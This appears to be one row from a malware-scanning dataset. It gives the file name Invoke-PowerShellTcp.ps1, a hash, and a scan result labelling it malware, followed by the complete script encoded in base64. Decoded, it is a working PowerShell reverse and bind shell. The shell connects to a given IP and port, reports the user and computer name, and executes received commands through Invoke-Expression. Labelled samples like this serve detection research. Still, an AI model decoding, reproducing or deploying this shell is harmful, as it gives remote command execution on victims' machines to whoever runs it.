Invoke-PowerShellTcp.ps1,57b97d7f89d707a6f728f02367175d80,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVBvd2VyU2hlbGxUY3AgCnsgCjwjCi5TWU5PUFNJUwpOaXNoYW5nIHNjcmlwdCB3aGljaCBjYW4gYmUgdXNlZCBmb3IgUmV2ZXJzZSBvciBCaW5kIGludGVyYWN0aXZlIFBvd2VyU2hlbGwgZnJvbSBhIHRhcmdldC4gCgouREVTQ1JJUFRJT04KVGhpcyBzY3JpcHQgaXMgYWJsZSB0byBjb25uZWN0IHRvIGEgc3RhbmRhcmQgbmV0Y2F0IGxpc3RlbmluZyBvbiBhIHBvcnQgd2hlbiB1c2luZyB0aGUgLVJldmVyc2Ugc3dpdGNoLiAKQWxzbywgYSBzdGFuZGFyZCBuZXRjYXQgY2FuIGNvbm5lY3QgdG8gdGhpcyBzY3JpcHQgQmluZCB0byBhIHNwZWNpZmljIHBvcnQuCgpUaGUgc2NyaXB0IGlzIGRlcml2ZWQgZnJvbSBQb3dlcmZ1biB3cml0dGVuIGJ5IEJlbiBUdXJuZXIgJiBEYXZlIEhhcmR5CgouUEFSQU1FVEVSIElQQWRkcmVzcwpUaGUgSVAgYWRkcmVzcyB0byBjb25uZWN0IHRvIHdoZW4gdXNpbmcgdGhlIC1SZXZlcnNlIHN3aXRjaC4KCi5QQVJBTUVURVIgUG9ydApUaGUgcG9ydCB0byBjb25uZWN0IHRvIHdoZW4gdXNpbmcgdGhlIC1SZXZlcnNlIHN3aXRjaC4gV2hlbiB1c2luZyAtQmluZCBpdCBpcyB0aGUgcG9ydCBvbiB3aGljaCB0aGlzIHNjcmlwdCBsaXN0ZW5zLgoKLkVYQU1QTEUKUFMgPiBJbnZva2UtUG93ZXJTaGVsbFRjcCAtUmV2ZXJzZSAtSVBBZGRyZXNzIDE5Mi4xNjguMjU0LjIyNiAtUG9ydCA0NDQ0CgpBYm92ZSBzaG93cyBhbiBleGFtcGxlIG9mIGFuIGludGVyYWN0aXZlIFBvd2VyU2hlbGwgcmV2ZXJzZSBjb25uZWN0IHNoZWxsLiBBIG5ldGNhdC9wb3dlcmNhdCBsaXN0ZW5lciBtdXN0IGJlIGxpc3RlbmluZyBvbiAKdGhlIGdpdmVuIElQIGFuZCBwb3J0LiAKCi5FWEFNUExFClBTID4gSW52b2tlLVBvd2VyU2hlbGxUY3AgLUJpbmQgLVBvcnQgNDQ0NAoKQWJvdmUgc2hvd3MgYW4gZXhhbXBsZSBvZiBhbiBpbnRlcmFjdGl2ZSBQb3dlclNoZWxsIGJpbmQgY29ubmVjdCBzaGVsbC4gVXNlIGEgbmV0Y2F0L3Bvd2VyY2F0IHRvIGNvbm5lY3QgdG8gdGhpcyBwb3J0LiAKCi5FWEFNUExFClBTID4gSW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyBmZTgwOjoyMGM6MjlmZjpmZTlkOmI5ODMgLVBvcnQgNDQ0NAoKQWJvdmUgc2hvd3MgYW4gZXhhbXBsZSBvZiBhbiBpbnRlcmFjdGl2ZSBQb3dlclNoZWxsIHJldmVyc2UgY29ubmVjdCBzaGVsbCBvdmVyIElQdjYuIEEgbmV0Y2F0L3Bvd2VyY2F0IGxpc3RlbmVyIG11c3QgYmUKbGlzdGVuaW5nIG9uIHRoZSBnaXZlbiBJUCBhbmQgcG9ydC4gCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE1LzA1L3dlZWstb2YtcG93ZXJzaGVsbC1zaGVsbHMtZGF5LTEuaHRtbApodHRwczovL2dpdGh1Yi5jb20vbmV0dGl0dWRlL3Bvd2Vyc2hlbGwvYmxvYi9tYXN0ZXIvcG93ZXJmdW4ucHMxCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCiM+ICAgICAgCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0icmV2ZXJzZSIpXSBQYXJhbSgKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iYmluZCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJElQQWRkcmVzcywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJiaW5kIildCiAgICAgICAgW0ludF0KICAgICAgICAkUG9ydCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmV2ZXJzZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lPSJiaW5kIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQmluZAoKICAgICkKCiAgICAKICAgIHRyeSAKICAgIHsKICAgICAgICAjQ29ubmVjdCBiYWNrIGlmIHRoZSByZXZlcnNlIHN3aXRjaCBpcyB1c2VkLgogICAgICAgIGlmICgkUmV2ZXJzZSkKICAgICAgICB7CiAgICAgICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJElQQWRkcmVzcywkUG9ydCkKICAgICAgICB9CgogICAgICAgICNCaW5kIHRvIHRoZSBwcm92aWRlZCBwb3J0IGlmIEJpbmQgc3dpdGNoIGlzIHVzZWQuCiAgICAgICAgaWYgKCRCaW5kKQogICAgICAgIHsKICAgICAgICAgICAgJGxpc3RlbmVyID0gW1N5c3RlbS5OZXQuU29ja2V0cy5UY3BMaXN0ZW5lcl0kUG9ydAogICAgICAgICAgICAkbGlzdGVuZXIuc3RhcnQoKSAgICAKICAgICAgICAgICAgJGNsaWVudCA9ICRsaXN0ZW5lci5BY2NlcHRUY3BDbGllbnQoKQogICAgICAgIH0gCgogICAgICAgICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9CgogICAgICAgICNTZW5kIGJhY2sgY3VycmVudCB1c2VybmFtZSBhbmQgY29tcHV0ZXJuYW1lCiAgICAgICAgJHNlbmRieXRlcyA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygiV2luZG93cyBQb3dlclNoZWxsIHJ1bm5pbmcgYXMgdXNlciAiICsgJGVudjp1c2VybmFtZSArICIgb24gIiArICRlbnY6Y29tcHV0ZXJuYW1lICsgImBuQ29weXJpZ2h0IChDKSAyMDE1IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi4gQWxsIHJpZ2h0cyByZXNlcnZlZC5gbmBuIikKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCkKCiAgICAgICAgI1Nob3cgYW4gaW50ZXJhY3RpdmUgUG93ZXJTaGVsbCBwcm9tcHQKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCdQUyAnICsgKEdldC1Mb2NhdGlvbikuUGF0aCArICc+JykKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCkKCiAgICAgICAgd2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgJEVuY29kZWRUZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZwogICAgICAgICAgICAkZGF0YSA9ICRFbmNvZGVkVGV4dC5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKQogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0V4ZWN1dGUgdGhlIGNvbW1hbmQgb24gdGhlIHRhcmdldC4KICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiU29tZXRoaW5nIHdlbnQgd3Jvbmcgd2l0aCBleGVjdXRpb24gb2YgY29tbWFuZCBvbiB0aGUgdGFyZ2V0LiIgCiAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAkXwogICAgICAgICAgICB9CiAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgJ1BTICcgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgJz4gJwogICAgICAgICAgICAkeCA9ICgkZXJyb3JbMF0gfCBPdXQtU3RyaW5nKQogICAgICAgICAgICAkZXJyb3IuY2xlYXIoKQogICAgICAgICAgICAkc2VuZGJhY2syID0gJHNlbmRiYWNrMiArICR4CgogICAgICAgICAgICAjUmV0dXJuIHRoZSByZXN1bHRzCiAgICAgICAgICAgICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKQogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpCiAgICAgICAgICAgICRzdHJlYW0uRmx1c2goKSAgCiAgICAgICAgfQogICAgICAgICRjbGllbnQuQ2xvc2UoKQogICAgICAgIGlmICgkbGlzdGVuZXIpCiAgICAgICAgewogICAgICAgICAgICAkbGlzdGVuZXIuU3RvcCgpCiAgICAgICAgfQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJTb21ldGhpbmcgd2VudCB3cm9uZyEgQ2hlY2sgaWYgdGhlIHNlcnZlciBpcyByZWFjaGFibGUgYW5kIHlvdSBhcmUgdXNpbmcgdGhlIGNvcnJlY3QgcG9ydC4iIAogICAgICAgIFdyaXRlLUVycm9yICRfCiAgICB9Cn0=
